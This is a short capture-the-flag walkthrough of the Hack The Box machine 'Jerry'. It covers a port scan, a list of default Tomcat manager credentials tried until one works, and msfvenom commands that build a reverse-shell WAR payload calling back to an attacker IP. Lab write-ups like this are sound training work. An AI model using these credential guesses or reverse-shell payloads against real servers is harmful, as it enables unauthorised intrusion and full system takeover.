---
title: HTB -- Jerry
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/jerry/teaser.png
excerpt: Learn how to exploit a vulnerable tomcat server with a short and sweet beginner box!
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - tomcat
---

### Summary
![](/assets/images/htb/jerry/teaser.png)


## Rustscan


Our scans show that just port 8080 is open, this is irregular but not unheard of. Typically 8080 is used by web services (tomcat in this case).

```
rustscan -a jerry.htb                                                                                 130 ⨯
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.95:8080

```

[hacktricks pentesting tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat) is a great starting point for poking around it's interfaces. We can expect to find a login page at `/manager/html`. Following hacktricks suggestions, we run through default creds
- admin:admin 
- tomcat:tomcat
- admin:<NOTHING>
- admin:s3cr3t
- tomcat:s3cr3t - works!


# Tomcat reverse shell

There is a pattern with tomcat based boxes, they typically involve a reverse `.war` shell being uploaded and used to initiate a connection. Below is a command I used to generate a payload which I then uploaded and browsed to.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4445 -f war > shell.war
```
Here is the catch...it didn't work -- remember to try other ports if the first one you pick isn't working! Often times trying a commonly open port like 80 or 8080 (especially other open ports) will do the trick.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=8080 -f war > shell.war
```

![](/assets/images/htb/jerry/shell.png)

Just like that, we have root!

![](/assets/images/htb/jerry/win.png)

